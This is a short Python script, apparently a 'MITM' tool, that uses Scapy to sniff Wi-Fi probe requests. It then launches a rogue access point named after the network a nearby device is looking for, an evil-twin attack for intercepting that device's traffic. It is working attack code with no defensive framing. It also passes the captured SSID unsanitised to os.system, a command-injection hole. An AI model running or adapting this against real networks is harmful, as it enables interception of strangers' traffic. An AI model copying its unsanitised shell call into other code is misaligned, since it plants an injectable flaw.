#!/usr/bin/env python

from scapy.all import *
import os

ap_list = []
print "SC: https://gist.github.com/securitytube/5291959"
print "Welcome to the TDG MITM Script"
print ""
print "========== Looking for probe request packages =========="
def PacketHandler(pkt) :

  if pkt.haslayer(Dot11ProbeReq) :
      if pkt.info != "":
        if pkt.info not in ap_list :
                print "SSID found!"
                print ""
                print "========== SSID Found         =========="
                ap_list.append(pkt.info)
                print "AP MAC: %s with SSID: %s " %(pkt.addr2, pkt.info)
                print ""
                print "========== Creating AP       =========="
                print " SSID: "+pkt.info
                print " Password: "
                print " AP IP addr.:"
                print "-----------------------------------------"
                print ""
                print "Please wait, the AP will reboot"
                print "Starting ./scripts/startAP.sh "+pkt.info
                os.system("./scripts/startAP.sh "+pkt.info)
                exit()

sniff(iface="wlan1", prn = PacketHandler)
